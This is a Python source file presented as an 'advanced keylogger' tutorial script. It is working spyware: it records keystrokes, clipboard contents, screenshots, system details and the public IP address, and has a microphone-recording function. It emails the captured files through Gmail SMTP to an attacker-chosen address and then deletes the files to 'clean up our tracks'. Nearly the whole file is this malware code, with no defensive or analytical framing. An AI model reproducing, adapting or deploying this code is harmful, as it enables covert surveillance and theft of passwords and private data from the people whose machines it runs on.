# keylogger.py
# Create an Advanced Keylogger in Python
# Author: Aditya

# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard #only works with windows.....

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "systeminfoo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"


microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

email_address = " " # Enter disposable email here
password = " " # Enter email password here

username = getpass.getuser()

toaddr = " " # Enter the email address you want to send your information to

file_path = " " # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend

# email controls (used this for reference https://www.geeksforgeeks.org/data-science/how-to-send-automated-email-messages-in-python/)
'''
✅ Construct email messages
✅ Attach files
✅ Encode attachments
✅ Send email via SMTP
'''
def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()  #creat empty email container obj using py email pkg.

    # Email headers
    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    # Adds plain text body.

    body = "we here!!!!! "

    msg.attach(MIMEText(body, 'plain'))

    #Opens file in rb mode.

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream') # some defaults(Generic container for any file.)

    p.set_payload((attachment).read()) #Loads file data into object.

    encoders.encode_base64(p) # transmit it safely.

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename) #Tells email client this is a downloadable file.

    msg.attach(p) #Adds attachment to email.

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls() #tls startin

    # then we send email and quit....

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddr) #Sends key log file even before recording.

# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()

# get the microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()


number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)
